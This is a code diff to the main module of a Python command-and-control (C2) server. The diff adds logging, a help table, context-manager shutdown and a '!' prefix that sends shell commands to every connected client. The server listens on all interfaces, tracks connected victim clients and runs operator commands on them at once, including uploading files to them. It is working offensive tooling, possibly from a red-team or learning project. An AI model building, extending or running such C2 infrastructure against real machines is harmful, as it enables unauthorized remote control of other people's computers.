@@ -1,12 +1,12 @@
 """
 This module is the main module for C2 server.
 """
-import logging
 import mimetypes
 import os
 from argparse import ArgumentParser
 from concurrent.futures.thread import ThreadPoolExecutor
 from datetime import datetime
+from logging import Formatter, DEBUG, StreamHandler, getLogger
 from select import select
 from shlex import split, quote
 from socket import socket, MSG_PEEK
@@ -14,18 +14,34 @@ from threading import Thread
 
 import magic
 import pandas
+import rich
+from rich.table import Table
 
+import utils
 from utils import C2Socket, Commands
 
 THREADED = True
-FILENAME_LOG = "server.log"
+FILENAME_LOG = open("server.log", "w")
 DOWNLOAD_DIRECTORY = "./download"
 N_WORKERS = os.cpu_count()
 DEFAULT_INTERFACE = '0.0.0.0'
 DEFAULT_PORT = 9999
 CLIENTS = dict()  # type: dict[tuple[str,int],Client]
 
-logging.basicConfig(filename=FILENAME_LOG, level=logging.DEBUG)
+logger = getLogger('server')
+logger.setLevel(DEBUG)
+
+handler = StreamHandler(FILENAME_LOG)
+handler.setLevel(DEBUG)
+handler.setFormatter(
+    Formatter('%(asctime)s %(name)s:%(levelname)s - %(filename)s:%(funcName)s:L%(lineno)d - %(message)s', '%H:%M:%S'))
+logger.addHandler(handler)
+
+utils_handler = StreamHandler(FILENAME_LOG)
+utils_handler.setLevel(DEBUG)
+utils_handler.setFormatter(utils.formatter)
+
+utils.logger.addHandler(utils_handler)
 
 
 class Client(C2Socket):
@@ -55,10 +71,11 @@ class CommandLauncher:
         Returns (bool): True if it is valid, else False
         """
         try:
-            self.cmd, *self.cmd_args = split(USER_INPUT)
+            self.cmd, *self.cmd_args = split(self.input)
             return True
         except ValueError as err:
             print(err)
+            logger.debug("command %s invalid : %s", self.input, err)
         return False
 
     @property
@@ -78,18 +95,18 @@ class CommandLauncher:
         """
         name = 'teardown_%s' % self.cmd
         if hasattr(self, name):
-            logging.debug("Starting teardown : %s", name)
+            logger.debug("Starting teardown : %s", name)
             getattr(self, name)()
         else:
-            logging.debug("No teardown named : %s", name)
+            logger.debug("No teardown named : %s", name)
 
     def start(self):
         """ Execute command
 
         This includes :
             - Cleaning clients list
-            - Executing each command asychronously on all clients
-            - Executing teardown functino
+            - Executing each command asynchronously on all clients
+            - Executing teardown function
 
         """
         clients_cleaner()
@@ -124,6 +141,17 @@ class ServerCommands(Commands):
         super().__init__(sock, launcher.cmd, launcher.cmd_args, launcher.input)
         self.sock = sock
         self.launcher = launcher
+
+    @staticmethod
+    def help():
+        """ Print help for implemented commands """
+        table = Table(show_header=True, header_style="bold blue", show_lines=True)
+        table.add_column("Command")
+        table.add_column("Description")
+        for name, fct in filter(lambda i: i[0].startswith('command_') and type(i[1]).__name__ == 'function',
+                                ServerCommands.__dict__.items()):
+            table.add_row(name, fct.__doc__)
+        rich.print(table)
 
     def command_upload(self, local_fn: str, dist_fn: str):
         """ Upload local file on remote client
@@ -197,7 +225,9 @@ def clients_cleaner():
             if not sock_cli.recv(32, MSG_PEEK):
                 raise Exception()
         except:
-            CLIENTS.pop((index.get(sock_cli).ip_address, index.get(sock_cli).port))
+            remote_cli = index.get(sock_cli).ip_address, index.get(sock_cli).port
+            logger.debug("Client %s:%s disconnected", remote_cli)
+            CLIENTS.pop(remote_cli)
 
 
 class ServerThread(Thread):
@@ -211,15 +241,21 @@ class ServerThread(Thread):
         self.socket.listen(10)
 
     def run(self):
-        print("Server started")
+        print("Server listen on interface %s port %s" % self.socket.getsockname())
         while True:
             client_sock, client_addr = self.socket.accept()
-            print(f'Client {client_addr} connected')
+            print(f'Client {client_addr} connected\n')
+            logger.debug(f'Client {client_addr} connected\n')
 
             CLIENTS[client_addr] = Client(*client_addr, client_sock)
 
-    def __del__(self):
-        print("Exit")
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *args, **kwargs):
+        logger.debug("Server exit")
+        for s in CLIENTS.values():
+            s.__exit__()
         self.socket.__exit__()
 
 
@@ -229,22 +265,24 @@ if __name__ == '__main__':
     PARSER.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help='Listening port')
     ARGS = PARSER.parse_args()
 
-    SERVER_THREAD = ServerThread((ARGS.interface, ARGS.port))
-    SERVER_THREAD.start()
     try:
-        while True:
-            USER_INPUT = input(">> ").strip()
-            if USER_INPUT:
-                if USER_INPUT in ["quit", "exit", "bye"]:
-                    break
-
-                CL = CommandLauncher(USER_INPUT)
-                if not CL.is_valid():
-                    print("Bad syntax")
-                CL.start()
+        with ServerThread((ARGS.interface, ARGS.port)) as server:
+            server.start()
+            while True:
+                USER_INPUT = input(">> ").strip()
+                if USER_INPUT:
+                    if USER_INPUT in ["quit", "exit", "bye"]:
+                        break
+                    if USER_INPUT in ["clear"]:
+                        os.system('clear')
+                    elif USER_INPUT in ["help", "h"]:
+                        ServerCommands.help()
+                    else:
+                        if USER_INPUT.startswith('!'):
+                            USER_INPUT = 'sh ' + USER_INPUT[1:]
+                        CL = CommandLauncher(USER_INPUT)
+                        if not CL.is_valid():
+                            print("Bad syntax")
+                        CL.start()
     except KeyboardInterrupt:
         pass
-    finally:
-        for s in CLIENTS.values():
-            s.__exit__()
-        SERVER_THREAD.socket.__exit__()
